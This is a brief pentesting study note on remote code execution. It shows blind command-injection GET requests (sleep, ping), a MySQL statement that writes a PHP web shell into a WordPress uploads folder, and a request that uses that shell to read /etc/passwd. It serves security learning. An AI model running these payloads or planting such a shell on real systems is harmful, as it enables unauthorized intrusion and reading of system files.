---
title: RCE attack - Remote Code Execution
author: amandaguglieri
draft: false
TableOfContents: true
tag: pentesting, web pentesting
---

# RCE attack - Remote Code Execution

_RCE_ attacks involve attackers manipulating network traffic by exploiting code vulnerabilities to access a corporate system.

Exploiting Blind Remote Execution Vulnerability attack in a GET request in BurpSuite (to run the queries) and Wireshark (to capture the traffic).

```
________
GET /script.php?c=sleep+5&ok=ok HTTP/1.1
Host 192.168.137.130
User Agent....
...
________
```


Also other command:

```
GET /script.php?c=ping+192.168.139.130+-c+5&ok=ok HTTP/1.1
```



## Gaining a reverse shell from SQL injection

Take a wordpress installation that uses a mysql database. If you manage to login into the mysql pannel (/phpmyadmin) as root then you could upload a php shell to the /wp-content/uploads/ folder.

```mysql
Select "<?php echo shell_exec($_GET['cmd']);?>" into outfile "/var/www/https/blogblog/wp-content/uploads/shell.php";
```

Now code can be executed from the browser: 

```
https://192.168.56.108:12380/blogblog/wp-content/uploads/shell.php?cmd=cat+/etc/passwd
```